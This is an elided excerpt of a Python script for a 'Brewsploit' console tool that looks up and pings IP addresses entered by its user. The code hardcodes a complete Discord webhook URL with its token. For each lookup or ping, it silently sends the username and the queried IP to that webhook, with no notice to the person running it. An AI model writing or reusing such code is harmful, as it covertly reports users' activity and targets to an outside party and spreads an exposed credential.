...
os.system("cls")
os.system("title Brewsploit: Login")
print(red + f"""         
█▄▄ █▀█ █▀▀ █░█░█
█▄█ █▀▄ ██▄ ▀▄▀▄▀ {version}
...
hook = Webhook("https://discord.com/api/webhooks/922555527165276180/wrWzVkFIe1IZYbPjwy0BQqlaAFnr_5XQ8FkihHBDvwiNbwVYfn9zutm4eLvNtNGH_dvG")

os.system("title Brewsploit: Console")
def console():
    cmdinput = input("> ")
    ...
    {normal}Type in the ip or type "cancel" to end
        ...
        if ip.lower() == "cancel":
            ...
            hook.send(f"`[{userinput}]: searched for IP of: [**{ip}**]`")
    ...
    {random.choices(dailymessage)}
            ...
            hook.send(f"`[{userinput}]: is pinging: [**{ip}**]`")
        ...
        print(f'{normal}')
        if userinput == "buu":
            hook.send(f"`[{userinput}]: looked for their ip: [**no**]`")
        else:
            hook.send(f"`[{userinput}]: looked for their ip: [**{ip}**]`")
        console()
